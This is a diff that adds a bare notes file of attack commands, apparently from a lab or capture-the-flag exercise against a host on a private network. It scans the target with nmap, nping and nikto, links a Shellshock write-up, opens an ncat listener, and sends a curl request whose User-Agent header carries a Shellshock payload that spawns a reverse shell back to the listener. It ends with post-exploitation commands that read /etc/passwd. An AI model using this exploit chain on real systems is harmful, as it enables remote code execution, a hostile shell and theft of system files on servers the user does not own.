@@ -1,0 +1,19 @@
+
+# nmap -p- -T4 192.168.59.* -Pn -n -v --exclude 192.168.59.1 -oN hosts.txt
+
+# nping --tcp -flags syn -p80 192.168.59.135 -c 1
+
+$ ./nikto.pl -host 192.168.59.135
+
+# https://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html
+
+$ ncat -l 4444 -v
+
+$ curl -v --user-agent "() { :;}; /bin/sh -c \"nc 192.168.59.1 4444 -e /bin/sh\"" http://192.168.59.135/cgi-bin/status
+
+
+$ id
+$ pwd 
+$ cd / 
+$ ls
+$ cat /etc/passwd
